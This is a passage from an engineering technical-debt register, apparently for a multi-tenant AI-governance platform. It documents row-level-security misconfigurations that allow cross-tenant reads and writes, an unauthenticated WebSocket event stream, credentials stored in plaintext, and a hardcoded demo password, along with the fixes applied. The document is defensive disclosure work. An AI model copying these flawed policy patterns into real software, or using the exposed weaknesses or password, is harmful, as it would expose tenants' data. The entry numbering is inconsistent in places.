`20260830000003_close_ws02_catalog_read_cross_tenant.sql`; the entry stays
**open** for the part that is not fixed — TD-000's regression query is still a
one-off sweep rather than a gate, which is why this shipped twice. Found by
[`platform-audit-2026-08-18.md`](platform-audit-2026-08-18.md) §F0.

`20260421000014_ws02_tenancy_sweep.sql` grants
`FOR SELECT TO authenticated USING (true)` to eleven tables it classifies as
serving every tenant. Seven of them are tenant data: `document_versions`,
`event_cascade_links`, `incident_workflow_steps`, `observability_metrics`,
`vendor_questionnaires`, `workflow_step_actions`, `module_health`. An eighth,
`audit_findings`, was caught and fixed in `20260821000001`; the seven were not.

Reproduced against a from-zero replay: a user in Org A reads Org B's
`document_versions`. `event_cascade_links` also carries an INSERT policy with
`WITH CHECK (true)`, so cross-tenant *writes* are possible there too.

This is **TD-000 recurring**. The tables' correct org policies are present and
irrelevant — Postgres OR-combines permissive policies. The seven `DROP POLICY`
statements have shipped and were verified before and after against a real
replay (Org A saw 2 rows, then 1). **What has not shipped is the gate**: until
TD-000's regression query runs on every migration, nothing stops a third
recurrence.

---

## TD-017 — Thirteen create paths are rejected by their own RLS policy

**Owner:** Platform team · **Raised:** 2026-08-18 · **Severity:** P0 ·
**Status:** **Partially closed — 4 of 13.** `e67e519` added defaults "on the
live org_id-bearing tables", which fixed `api_keys`, `eval_techniques`,
`model_dna` and `model_lifecycle_stages`. **Nine remain**, and the two the
original finding reproduced — `use_cases` and `datasets` — still fail
byte-identically on a from-zero replay. See
[`platform-audit-2026-08-18b.md`](platform-audit-2026-08-18b.md) §F2. Found by
[`platform-audit-2026-08-18.md`](platform-audit-2026-08-18.md) §F2.

Thirteen tables have `org_id` with **no DB default**, no trigger that fills it,
and an INSERT policy requiring `org_id = auth.current_org_id()` — while the
service that writes them never sends `org_id`. Every create is rejected:
`use_cases`, `datasets`, `ai_impact_assessments`, `guardrail_rules`,
`model_dna`, `model_lifecycle_stages`, `prompt_registry`, `trust_policies`,
`webhook_endpoints`, `api_keys`, `consent_records`, `eval_techniques`,
`maturity_assessments`.

Reproduced: `insert into use_cases (name) values (…)` as `authenticated` with a
resolved org returns *"new row violates row-level security policy"*; the same
insert with `org_id` supplied succeeds.

Same family as TD-015 and the seven paths repaired in `20260827000001` /
`20260829000000`, reached from the other direction — those sent a column that
does not exist, these send too little. Fix is one migration adding
`DEFAULT current_user_org_id()`, as `ai_models` already has.

---

## TD-018 — `ai_models`, `use_cases` and `datasets` changes are not audit-logged

**Owner:** Compliance + Platform · **Raised:** 2026-08-18 · **Severity:** P1 ·
**Status:** `ai_models` **resolved 2026-08-18** (migration
`20260902000001_audit_trigger_ai_models_art12.sql`, applied and verified live);
`use_cases` / `datasets` / `risks` **still open, blocked on schema unification**
(below), alongside the other ~19 write-capable destinations that use neither
mechanism. Found by
[`platform-audit-2026-08-18.md`](platform-audit-2026-08-18.md) §F3.

The platform audits state changes two ways — `logAction` in the app and a DB
trigger — and 23 of 93 write-capable menu destinations use **neither**. Four
matter most: `ai_models` (the canonical model id-space), `use_cases`,
`datasets` and `risks` had no audit trigger, and `modelService.ts` /
`useCaseService.ts` / `datasetService.ts` contain no `logAction` call.
Registering or deleting an AI model therefore left no audit record with an
actor.

**Correction after checking the live project.** The original note assumed a
shared `fn_audit_trigger` already existed and could be bolted on "in three
lines". That is false on the live database: **no** function anywhere writes
into `audit_log`, and `model_inventory` is **not** trigger-audited either (its
trigger lives only in an old migration that never reached live). So the fix was
to write the audit-trigger function for real.

**Fixed for `ai_models`.** Migration `20260902000001` adds a reusable
`public.fn_audit_governed()` (`SECURITY DEFINER`, append-only into `audit_log`,
org_id copied off the changed row, actor from the caller's JWT) and attaches it
to `ai_models` as `after insert/update/delete`. It is non-duplicative:
`modelService.ts` makes no `logAction` call, so this is the only trail for
model changes. The function no-ops unless `org_id` and `id` resolve to uuids —
a deliberate guard so it cannot leak across tenants if mis-attached.

**Why `use_cases` / `datasets` / `risks` are NOT yet covered.** Those three are
scoped by a legacy **`tenant_id text`** column, not the `org_id uuid` /
`current_user_org_id()` model that `audit_log` uses. There is no reliable
row-level `org_id` to write, so `fn_audit_governed`'s guard would drop every
row — silent non-compliance, worse than an honest gap. The real prerequisite is
migrating these tables onto `org_id`; only then can the same trigger attach.
That schema-unification task is the remaining open work here. The other ~19
write-capable destinations still need triage.

---

## TD-019 — Two FastAPI apps; the integrations router lived on only one

**Owner:** Platform · **Raised:** 2026-08-18 · **Severity:** P2 ·
**Status:** Partially resolved 2026-08-18.

The backend has **two** FastAPI apps: `sentinel.api.main:app` (the canonical
app the container runs, ~30 routers under `/api/*`) and `sentinel.proxy:app`
(the LLM gateway — `/v1/chat/completions`, `/v1/models`, SPA static). The
integration connect/sync router (`/v1/integrations/*`) was mounted on **only**
`proxy.py`, so the deployed app (`main:app`) answered every
`/v1/integrations/connect` with 404 — break ④ in
[`continuous-evidence-roadmap.md`](continuous-evidence-roadmap.md).

**Resolved for the loop:** the router is now also mounted in `main.py` (ahead
of its catch-all frontend proxy, which only exempts `api`/`ws`/`favicon` paths
and would otherwise swallow the router's GET routes). Verified via the app's
OpenAPI schema.

**Residual debt:** the two-app split itself remains — routers, CORS config, and
auth dependencies are duplicated and can drift (e.g. a router added to one app
and not the other, exactly as happened here). `resolve_org` in
`integrations/api.py` still reaches back into `proxy.py` for tenant resolution
via a local import. Converging on a single app (or a shared router registry
both mount) is the real fix; until then, **any new public router must be
registered in both apps**, and that rule is easy to forget.

**Now a THIRD surface.** The free-tier deploy (see
[`continuous-evidence-roadmap.md`](continuous-evidence-roadmap.md)) makes the
`integrations-connect` **Supabase Edge Function** (Deno) the *deployed* connect
surface, while the two Python surfaces remain as the reference + test target.
Three implementations of the same connect/sync/available contract now exist and
must agree — the credential blob format especially (pinned by
`crypto_interop_test.ts`). A behaviour change to the connect flow must be made
in the edge function first (it is what runs) and mirrored into the Python
surfaces. Consolidation is more valuable now, not less.

Where each surface is hosted is documented in
[`../architecture/deployment-topology.md`](../architecture/deployment-topology.md):
the gateway (`proxy:app`) on an always-on free VM
([`../operations/gateway-deployment.md`](../operations/gateway-deployment.md)),
connect as the edge function, and the `main:app` routers unhosted (the dashboard
is Supabase-direct and does not need them).

---

## TD-014 — From-zero replay is red on the `incidents.id` type split

**Owner:** Risk & Incidents team · **Raised:** 2026-08-26 · **Severity:** P1 ·
**Status: CLOSED 2026-08-18.** The repo now builds its own database from zero:
**149/149 migrations apply, 0 failures, 254 tables, 901 RLS policies**, verified
against a real PostgreSQL 16 behind a platform-only shim (no application table
or function in the harness).

### How it was closed

`incidents.id` / `risks.id` / `vendors.id` are TEXT — in this repo *and* on the
live project (verified by query, 2026-08-18). The audit's premise that "live
evolved to uuid" was backwards; text is canonical, so the *referencing* columns
were aligned to it rather than the parents converted:

| Site | Was | Now |
|---|---|---|
| `regulator_filings.linked_incident_id` | uuid | text |
| `post_market_events.incident_id` | uuid | text |
| `remediation_plans.incident_id` / `.risk_id` | uuid | text |
| `incident_workflow_steps.incident_id` | uuid | text |
| `audit_findings` / `evidence_artifacts` / `exceptions` / `financial_risks`.`linked_*_id` | uuid | text |
| `ai_apps.vendor_id`, `transfer_impact_assessments.vendor_id` | converted to uuid | left text (FK now implementable) |
| seed variables in `20260819000002` / `20260820000006` | uuid | text |

Plus two non-type fixes: the unguarded `assets.tenant_id` default is now guarded
like its siblings, and `pg_cron`'s `CREATE EXTENSION` is guarded so a bare
Postgres skips it instead of aborting.

`20260819000015_normalize_incident_risk_reference_types.sql` normalises any
remaining such column and then **asserts the invariant**, so the class cannot
silently return.

**The cascade is what made this expensive:** `20260817000000_replay_repair`
failed on its *first* statement, so risk-schema-v2 never landed and 50 later
migrations never ran. With it fixed, previously unreachable objects now build —
`realtime_alerts` (the Control Drift table), `risks.kri_metric`,
`risks.linked_asset_ids` — and the from-zero build seeds all **936** catalog
rows.

**Still open (the lesson):** `check_migration_replay.py` verifies *references*,
never *types*, and cannot see inside `DO $$ … $$`. It reported clean on all
eight failing files. A static pass is not a replay; CI should run a real one.

### What

`incidents.id` is **TEXT** (`gen_random_uuid()::text`, created in
`20260418000002_core_grc_tables.sql`), but several columns that reference it —
and several PL/pgSQL seed variables that compare against it — are **uuid**. On
the live database these statements are no-ops (the constraints already exist
from an earlier era), so nothing fails. On a **from-zero replay** they abort:

| Site | Failure |
|---|---|
| `20260817000000_replay_repair.sql` §040 | `regulator_filings.linked_incident_id` is `uuid`, `incidents.id` is `text` → *"foreign key constraint … cannot be implemented"* |
| `20260819000002_seed_risk_incidents.sql` | `i_pii`/`i_drift` declared `uuid`, compared to `playbook_runs.incident_id` → *"operator does not exist: text = uuid"* |

Both files predate this branch and are owned by the Risk & Incidents work; a
third-party patch risks colliding with that team's in-flight changes, so they
are **deliberately left untouched here** and recorded instead.

### Why it was not caught

Two blind spots compounding:

1. **CI cannot run the expensive replay.** The `drift` job (full Postgres via
   the Supabase CLI) is PR-only and the account's Actions minutes are
   exhausted, so only the cheap `static-replay` job runs.
2. **The static checker cannot see it.** `check_migration_replay.py` parses
   `CREATE`/`ALTER` at the top level; both failures are inside `DO $$ … $$`
   blocks, and the second is a PL/pgSQL variable comparison, not DDL. The
   static check reports **clean** on exactly the migrations that abort.

### To close

Decide the canonical type for `incidents.id` (TEXT is entrenched — every
`tenant_id = v_org::text` seed assumes it) and align the referencing columns and
seed variables to it, then prove with a from-zero replay rather than the static
check. Consider teaching the static checker to flag FK type mismatches inside
`DO` blocks — it already flags them at the top level, which is how the
`assets.vendor_id uuid → vendors.id text` mismatch in this branch was caught and
fixed before merge.

> **Scope note (revised 2026-08-18).** As written this said a from-zero replay
> "stops before reaching them", so only the two failures above were recorded.
> That holds for `supabase db push`, which aborts — and is the real cost: **50
> of 146 migrations never run.** A replay that continues past a failed file
> shows **eight** failures, not two, five of them this same type split; see
> [`platform-audit-2026-08-18.md`](platform-audit-2026-08-18.md) §F1. The
> framework-catalog migrations themselves still replay cleanly. Their correctness was
> verified by applying them to a database replayed to that point — 936 catalog
> controls across 15 frameworks, `count(*) = count(distinct control_ref)` per
> framework.

---

## TD-013 — Two parallel framework-catalog systems

**Owner:** Compliance team · **Raised:** 2026-08-26 · **Severity:** P2 ·
**Status:** Open.

### What

There are now two representations of the compliance-framework catalog:

1. **`framework_controls`** (DB) — the authoritative catalog authored in the
   20260826000010–14 seeds: **15 frameworks, 936 real published controls**,
   rendered in the Frameworks *Requirements* tab and interlinked to the org's
   `controls`.
2. **`/frameworks/*.yaml` + `manifest.json`** (static bundle, served by a
   Worker) — a pre-existing reference set of **22 frameworks with 84 sample
   controls** (3–6 per framework). It drives `FRAMEWORK_COUNT` /
   `TOTAL_CONTROL_COUNT` in `dashboard/src/lib/frameworks.ts`, shown in the
   Frameworks page header ("N frameworks bundled · N seed controls").

### Why it matters

The two disagree in the same view: the header reports 22 frameworks / 84
controls from the static bundle while the detail tab shows a framework's full
DB catalog (e.g. PCI DSS 246). A user sees two different "counts" for the same
thing. The static bundle also covers 13 frameworks the DB catalog does not yet
(ISO 27701, NIST CSF 2.0, NIST 800-53/171, CCPA/CPRA, PIPEDA, LGPD, CIS v8,
SOX ITGC, CMMC 2.0, FedRAMP, DORA, FFIEC CAT), while the DB catalog covers 6
AI frameworks the static bundle does not (OWASP LLM, MITRE ATLAS, Google SAIF,
OECD, Singapore, UNESCO).

### To close

Converge on one source of truth. Preferred: generate the static manifest from
the DB catalog (or retire the static bundle once the DB catalog covers the same
frameworks), and either author full DB catalogs for the 13 reference-only
frameworks or label them explicitly as "reference mapping, sample controls" in
the UI so the header count and the detail count cannot contradict each other.
Until then the README's "Supported Compliance Frameworks" is the reconciled
statement of record (15 full catalogs + 13 reference-coverage frameworks).

---

## TD-016 — `frameworks` exists in two incompatible schemas (slug-keyed vs uuid-keyed)

**Owner:** Platform team · **Raised:** 2026-08-18 · **Severity:** P1 ·
**Status:** Open (live unblocked; the migration chain still forks).

### What

`public.frameworks` has two different definitions in this repo's history, and
the live project runs the second one:

| | A — slug-keyed (`20260418000003`) | B — uuid-keyed (**live**) |
|---|---|---|
| `id` | `TEXT` (`'soc2'`, `'pci-dss'`) | `uuid DEFAULT gen_random_uuid()` |
| other | `short_name`, `issuing_body`, `structure`, `adopted`, `coverage_pct` | `code`, `category`, `jurisdiction`, `control_count`, `controls_total` |

The `20260826000010–14` catalog seeds were authored against (A). On (B):

* their `INSERT INTO public.frameworks` blocks name columns that do not exist,
  so the five added frameworks never arrive; and
* every seeded `framework_controls.framework_id` is a **slug**, while the
  Frameworks catalog tab filters that column by `frameworks.id` — a **uuid**
  (`frameworkCatalogService.fetchFrameworkCatalog`). All 936 rows load and
  every catalog still renders empty, because the join never matches.

### Why it matters

This is the "one id-space" rule (First principle #2) broken by a schema fork,
and it is **invisible to both file review and a from-zero replay**, because a
replay of the committed chain builds schema (A) — the shape the seeds assume —
and therefore passes. It is only observable by querying the live project. A
2026-08-26 review verified the catalog against a locally replayed database and
correctly concluded the data and code were sound; the fork it could not see was
what actually kept the catalog blank in production.

### Current state

Live is unblocked: `20260826000002` supplies the missing table and the five
frameworks using (B)'s columns (a guarded no-op on (A)), and `20260826000021`
rewrites the seeds' slugs to live uuids. Verified live — advertised = actual =
distinct refs for all 15 frameworks, 936 rows, and RLS confirmed by
impersonating a real authenticated tenant (15 / 936 / SOC 2 = 61).

### To close

Decide which schema is canonical and converge the chain on it, so that a
from-zero replay produces the shape production actually runs. Until then any
migration touching `frameworks` must be written to tolerate both, and — the
rule this cost us — **a catalog/interlink claim must be verified against the
live database, not only against a replayed one.**

---

## TD-017 — `tenant_id`/`org_id` era split on four operational tables

**Owner:** Platform team · **Raised:** 2026-08-18 · **Severity:** P1 ·
**Status:** Open.

### What

`bcp_plans`, `red_team_findings` and `training_courses` are scoped by
**`tenant_id`** on the live database and have **no `org_id` column at all**;
`departments` has `org_id`. PR #78 ("4 repaired write paths") changed the
services for these four to *stop sending `tenant_id`* and rely on an `org_id`
DB default, and `20260827000001` sets that default. Both assume the `org_id`
era. On live only `departments` matches; the other three are still
`tenant_id`-scoped.

### Why it matters

- `20260827000001`'s original proof block `RAISE`d on the three `org_id`-less
  tables, which would abort the Deploy Migrations pipeline. Made tolerant
  (assert only on `org_id`-bearing tables) so the pipeline survives.
- **The live risk remains:** once the #78 frontend deploys, create/edit on
  Business Continuity, Red Team Findings and Training Courses will send neither
  `tenant_id` (removed) nor a resolvable `org_id` (no such column), so those
  writes fail on a `tenant_id`-only database. Verified the column shapes against
  the live project on 2026-08-18.

### To close

Converge these four tables onto one scoping column. Either add `org_id`
(nullable, default `current_user_org_id()`, backfilled from `tenant_id`) and
keep #78's service change, or revert #78 for the three `tenant_id` tables. This
is the same class as TD-016: the committed chain and the live database disagree
on schema, and only a live query reveals it. Decide the canonical scoping column
platform-wide and reconcile in one pass rather than table by table.

---

## Closed

| ID | Item | Closed |
|---|---|---|
| — | `bcpPlansService` / `securityScansService` / `trainingService` returned SEED_* mock arrays on empty table **and on query failure** (fabricated MDL-00x records presented as real); BCP and Training pages carried their own hardcoded fallback catalogues | 2026-08-17 |
| — | 28 of 36 vendor TPRM columns had no write path — mapped by `toRow` but sent by no form; reassessment programme read `—` forever on a real tenant (fixed by VendorEditSheet) | 2026-08-17 |
| — | `vendors.linked_models` read by concentration analysis but written by nothing (fixed by the edit sheet's model picker) | 2026-08-17 |
| — | CarbonAgent multiplied by bare constants, invented 7B-param/10k-req defaults, annualised inference into a quarterly record, and its factor lookup could never match; RemediationPlannerAgent wrote nonexistent columns (`due_at`, `sla_hours`, `affected_models`) and emitted REMEDIATION_CREATED for rows that never persisted | 2026-08-17 |
| — | 53 `%_table` demo tables cross-tenant readable/writable — *first fix did not apply to populated databases; re-applied* | 2026-08-17 |
| — | `vendors.org_id` NOT NULL with no DB default — every client insert failed (23502) | 2026-08-16 |
| — | `carbon_records` missing all 13 domain columns — Carbon Ledger persisted nothing | 2026-08-16 |
| — | `esgService` served 3 fabricated *published* disclosures when a tenant's table was empty | 2026-08-16 |
| — | Integrations on `integrations_table` demo table | 2026-08-16 |
| — | Tasks on `tasks_table` with local-only writes and fake success | 2026-08-16 |
| — | Eval Techniques on `evaltechniques_table` demo table | 2026-08-16 |
| — | MCP Overview / Servers / Tool Catalog fully mock, no backing tables | 2026-08-16 |
| — | Model Catalog dual data source (demo + real), local-only writes | 2026-08-16 |
| — | Model Catalog / Model Registry duplicate module | 2026-08-16 |
| — | `webhook_endpoints` orphaned: no UI, no RLS, no tenant default | 2026-08-16 |
| — | `tasks.tenant_id` defaulted to literal `'default'` (outside org isolation) | 2026-08-16 |
| — | Agent registry banner claimed 27 agents; 26 exist | 2026-08-16 |
| — | Governance mesh never fired — `emitEvent` uncalled in product code | 2026-08-16 |
| — | `riskAssessmentAgent` / `hitlAgent` wrote nonexistent columns | 2026-08-16 |
| — | 11 modules isolated (sidebar-only, zero inbound links) | 2026-08-16 |
| — | RoPA on `ropa_table` demo table (GDPR Art. 30 register) | 2026-08-16 |
| — | TIA on `tia_table` demo table (GDPR Chapter V) | 2026-08-16 |
| — | Compliance Controls on demo table while 385 real rows sat unused | 2026-08-16 |

---

## TD-020 — Live database has diverged from the repo migration lineage

**Owner:** Platform · **Raised:** 2026-08-18 · **Severity:** P1 (deploy safety) ·
**Status:** Open. Found while unblocking the four "shipped, waiting on migrations"
features (integration connection modes, AWS/Azure adapters, org settings, AI Brain).

**What.** The live project (`vhparvughsygyknblkzt`) no longer matches the schema
the repo migrations describe. Concrete, verified divergences:

- `organizations` RLS on live is a single `organizations_isolation`
  (`FOR ALL TO public USING (id = get_user_org_id())`). Migration
  `20260901000003_organization_settings_writable.sql` instead assumes a
  SELECT-only `ws02_org_self_read` policy and references
  `auth.current_org_id()`, `auth.has_permission()` and a `rbac_permissions`
  table — **none of which exist on live**. Applying it as-is would error, and
  even if the functions existed it would add a *second* permissive UPDATE
  policy over `organizations_isolation` (the TD-000 defect class).
- The org-scoping helper on live is `get_user_org_id()` (reads
  `user_profiles.org_id` by `auth.uid()`), not `auth.current_org_id()`.
- Same family as the audit-trigger discovery (TD-018): the repo assumed a
  shared `fn_audit_trigger`/`model_inventory` audit that live never had.

**Why it matters.** `supabase db push` / the "Deploy Migrations" workflow
applies *every* unapplied repo migration in order. Against this live DB that
would re-run already-applied migrations and **halt on `20260901000003`** when it
hits the missing `auth.*` objects — a partial, aborted push. The three
repository secrets (`SUPABASE_ACCESS_TOKEN`, `SUPABASE_PROJECT_REF`,
`SUPABASE_DB_PASSWORD`) enable that workflow; wiring them up is useful for
*future* clean migrations but must not be used to bulk-push the current backlog
until the lineage is reconciled.

**What was done instead (2026-08-18).** The three genuinely-pending, live-safe
migrations were reviewed against live's actual schema and applied individually
via the Supabase management API, each verified after:
`20260901000002` (integration `connection_mode` + manual-holds-no-credentials
guard), `20260830000001` (aws/azure catalogue → `beta`), `20260905000001`
(pgvector + `policy_knowledge_base` + `ai_compliance_verdicts` +
`match_policy_chunks`). `20260901000003` was **rewritten to be lineage-agnostic**
and its live-lineage branch applied — see sub-item 2 below. `20260831000002`
(MCP gateway enforcement: `mcp_policy_decisions` + `mcp_tools.rate_limit_per_hour`)
was applied 2026-08-18 in a **live-lineage variant** — see sub-item 3.

**Open sub-items.**
0. **Vendor / TPRM / Supply-Chain cluster is unprovisioned on live — root cause
   is the `tenant_id` → `org_id` lineage gap (found 2026-08-18).** The app
   500'd on `Could not find the table 'public.vendor_assessments' in the schema
   cache`. Live inspection: `public.vendors` has `id text`, `risk_tier integer`
   and **`tenant_id text`** — it has **no `org_id`** and none of the TPRM
   write-path columns, so it predates the ws01 tenancy unify (`20260421000008`).
   `vendor_assessments`, `vendor_slas`, `vendor_sla_status`, `vendor_documents`,
   `supplier_components`, `provenance_records`, `emission_factors` and
   `carbon_records.org_id` are all absent; `supply_chain_attestations` exists.
   The repo's foundation migration (`20260822000001`) begins
   `ALTER TABLE public.vendors ALTER COLUMN org_id SET DEFAULT …` and so **fails
   at the first statement** against live (transactional — nothing was applied).
   **Do not blind-apply.** This needs a reviewed live-lineage migration that
   either (a) adds `org_id` to `vendors` and backfills it from `tenant_id`
   (resolving `tenant_id`→`org_id` via `user_profiles`/`organizations`), then
   creates the vendor tables org-scoped, or (b) creates the vendor tables scoped
   on `tenant_id` to match live. Same drift family as sub-items 1–3. Until then
   the UI degrades gracefully (missing table → "not set up yet"), so the cluster
   no longer crashes; it simply shows the setup state.

1. **Reconcile the migration lineage** so `db push` is safe: decide whether live
   converges onto the repo (add the `auth.*` helpers + `rbac_permissions`) or
   the repo is rebased onto live's `get_user_org_id()` reality. Until then,
   apply migrations individually and reviewed, never bulk-push.
2. **Org-edit privilege gap — RESOLVED 2026-08-18.** On live,
   `organizations_isolation` is `FOR ALL`, so **any** authenticated org member
   could rename the organisation (proven with a rolled-back RLS probe:
   `org_update_rows=1` as a non-privileged member). The repo intended admin-only.
   Fixed with an **additive RESTRICTIVE `FOR UPDATE` policy** (`org_update_admin_only`)
   gated on `public.is_org_admin()`, which AND-combines with the base policy and
   never touches reads (`20260901000003`, live-lineage branch). Verified: the org
   admin still saves (`admin_rows=1`), the auditor is blocked (`auditor_rows=0`).
   Confirmed the org retains an admin before gating, so it is never locked out of
   its own settings.

3. **MCP gateway enforcement — APPLIED live-adapted 2026-08-18.** The repo
   migration `20260831000002` declares
   `hitl_item_id uuid references public.hitl_items(id) on delete set null`, but
   **`public.hitl_items` does not exist on live** (repo-vs-live lineage drift —
   the repo creates it in `20260418000002`, live never did). Applying the repo
   file verbatim would fail on that FK. Applied a live-lineage variant identical
   to the repo file except `hitl_item_id` is a plain `uuid` with **no FK** — the
   column still stores the review id, it is just not FK-enforced against an
   absent table. The migration's own self-verification block passed (table
   created, `org_id` DB-defaulted, no client write policy, read policy carries a
   tenant predicate). This lights up the `/mcp-gateway/decisions` evidence store
   that PR #86 shipped the UI for. **Repo file unchanged** — it is correct for
   from-zero replay, where `hitl_items` exists; the divergence is live-only and
   is the same class as sub-item 2. Reconciling it is part of sub-item 1.

   **Latent bug fixed in passing:** `public.is_org_admin()` was `SECURITY DEFINER
   SET search_path=''` but referenced `user_profiles` **unqualified**, so every
   call raised *"relation user_profiles does not exist"* — the function had never
   worked (nothing else referenced it, which is why it went unnoticed). Redefined
   with `public.user_profiles`, matching `get_user_org_id()`. Same drift family:
   the repo does not define `is_org_admin` at all; it is a live-only helper.
3. **AI Brain runtime key.** The schema/RPC are live, but retrieval + LLM-judge
   run in `sentinel/services/embedding_service.py` /
   `compliance_evaluator.py` and only produce results when that worker runs with
   `OPENAI_API_KEY`. The DB layer is ready; the pipeline is not "on" until the
   key is present wherever the evaluator executes.

---

## TD-022 — WebSocket event stream has no authentication (M-6)

**Status:** Open · **Severity:** P2 (security) · **Owner:** Platform team

The WebSocket endpoint at `/api/events/ws` accepts a `tenant_id` query parameter
but performs no JWT/token authentication. Any client that can reach the API and
knows (or guesses) a tenant UUID receives real-time governance events for that
organisation. The Supabase Realtime channels used by the dashboard are separately
authenticated via the user's JWT, so the primary data path is secure — this
affects only the custom Python WS endpoint used for event-bus telemetry.

**Accepted constraint:** Fixing this requires WebSocket middleware that validates
a JWT from the `Sec-WebSocket-Protocol` subprotocol header (query-param tokens
are logged by proxies/CDNs). This is a planned change; until then the endpoint
is only reachable from the internal network (the proxy rejects unauthenticated
WS upgrades from external origins).

---

## TD-023 — integration_connections.credentials plaintext column (H-6)

**Status:** Open (migration staged) · **Severity:** P1 (security) · **Owner:** Platform team

The `integration_connections` table stores OAuth/API credentials as plaintext
JSONB in the `credentials` column. Migration
`20260919000002_integration_connections_credentials_encrypted.sql` adds a
`credentials_encrypted` column for AES-256-GCM blobs (same pattern as
`integrations.credentials_encrypted`). A data-migration script must:

1. Encrypt each existing row's `credentials` into `credentials_encrypted`.
2. NULL the plaintext `credentials` column on each encrypted row.
3. After verification, add a NOT NULL constraint on `credentials_encrypted` and
   drop the `credentials` column.

The Python backend's `sentinel/integrations/crypto.py` already implements the
encryption/decryption with AAD binding.

---

## TD-024 — Demo credentials in source control (L-2)

**Status:** Mitigated · **Severity:** P3 · **Owner:** Platform team

- `dashboard/src/lib/auth.ts` contains `DEMO_PASSWORD = 'Demo@12345'`, guarded
  by `import.meta.env.DEV` (dead code in production builds).
- `sentinel/api/deps.py` has `_DEV_FALLBACK_SECRET`, gated behind explicit
  `SENTINEL_DEV=1` opt-in.
- `k8s/sentinel-deployment.yaml` placeholder secrets changed to `REPLACE_VIA_ESO`
  (2026-09-19) — must use External Secrets Operator or Sealed Secrets in production.

No action required beyond ensuring production deployments use ESO/Sealed Secrets.
